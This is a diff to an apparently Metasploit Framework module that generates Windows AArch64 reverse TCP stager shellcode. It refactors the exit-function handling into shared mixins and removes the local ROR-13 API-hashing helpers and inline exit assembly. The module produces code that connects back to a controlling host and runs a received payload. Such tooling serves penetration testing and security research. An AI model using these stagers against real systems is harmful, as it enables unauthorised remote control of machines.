@@ -12,6 +12,8 @@ module Msf
   # for reverse_tcp_aarch64.rb (same pattern as ReverseTcp_x64).
   module Payload::Windows::ReverseTcp_Aarch64 # rubocop:disable Naming/ClassAndModuleCamelCase
     include Msf::Payload::Windows
+    include Msf::Payload::Windows::Aarch64
+    include Msf::Payload::Windows::Exitfunk_Aarch64
 
     def generate(_opts = {})
       conf = {
@@ -27,7 +29,7 @@ module Msf
     #
     # @option opts [Integer] :port The port to connect to
     # @option opts [String] :host The IPv4 address to connect to
-    # @option opts [String] :exitfunk The exit method (process, thread, none)
+    # @option opts [String] :exitfunk The exit method (process, thread, none, seh)
     # @return [String] raw shellcode bytes
     #
     def generate_reverse_tcp(opts = {})
@@ -41,13 +43,11 @@ module Msf
       ip_lo_imm = ip_bytes[0, 2].unpack1('v')
       ip_hi_imm = ip_bytes[2, 2].unpack1('v')
 
-      exit_hash = exitfunk_hash(opts[:exitfunk])
       asm = build_stager_asm(
         port_imm: port_imm,
         ip_lo_imm: ip_lo_imm,
         ip_hi_imm: ip_hi_imm,
-        exit_lo: exit_hash & 0xFFFF,
-        exit_hi: (exit_hash >> 16) & 0xFFFF
+        exitfunk: opts[:exitfunk]
       )
       compile_aarch64(asm)
     end
@@ -59,48 +59,13 @@ module Msf
 
     protected
 
-    # ROR-13 hash of a kernel32/ws2_32 export name, matching the asm
-    # find_function routine (stops on CBZ before adding the NUL).
-    def ror13_hash(str)
-      h = 0
-      str.each_byte do |b|
-        h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF
-        h = (h + b) & 0xFFFFFFFF
-      end
-      h
-    end
-
-    def exitfunk_hash(value)
-      case value.to_s.downcase
-      when 'thread'
-        ror13_hash('ExitThread')
-      when 'process', '', 'seh'
-        0x78b5b983 # TerminateProcess
-      when 'none'
-        ror13_hash('ExitProcess')
-      else
-        0x78b5b983
-      end
-    end
-
-    def compile_aarch64(asm_string)
-      require 'aarch64/parser'
-      parser = ::AArch64::Parser.new
-      asm = parser.parse(without_inline_comments(asm_string))
-      asm.to_binary
-    end
-
-    def without_inline_comments(string)
-      string.lines.map { |line| line.split('//', 2).first.strip }.reject(&:empty?).join("\n")
-    end
-
-    def build_stager_asm(port_imm:, ip_lo_imm:, ip_hi_imm:, exit_lo:, exit_hi:)
+    def build_stager_asm(port_imm:, ip_lo_imm:, ip_hi_imm:, exitfunk:)
       # Slot table (x29 + offset):
       #   0x00 kernel32_base  0x08 &find_function  0x10 VirtualAlloc
       #   0x18 LoadLibraryA   0x20 recv            0x28 WSAStartup
       #   0x30 WSASocketA     0x38 WSAConnect      0x48 FlushInstructionCache
       #   0x50 sockaddr_in    0x70 WSADATA
-      <<~ASM
+      asm = <<~ASM
         main:
           sub     sp, sp, #0x300
           mov     x29, sp
@@ -297,18 +262,8 @@ module Msf
           br      x23
         exitfunk_prep:
           b       exitfunk
-        exitfunk:
-          ldr     x3, [x29, #0x00]
-          movz    w0, ##{format('0x%04x', exit_lo)}
-          movk    w0, ##{format('0x%04x', exit_hi)}, lsl #16
-          ldr     x9, [x29, #0x08]
-          blr     x9
-          mov     x10, x0
-          movn    x0, #0
-          mov     w1, wzr
-          blr     x10
-          brk     #0
       ASM
+      asm + asm_exitfunk_aarch64(exitfunk: exitfunk)
     end
   end
 end
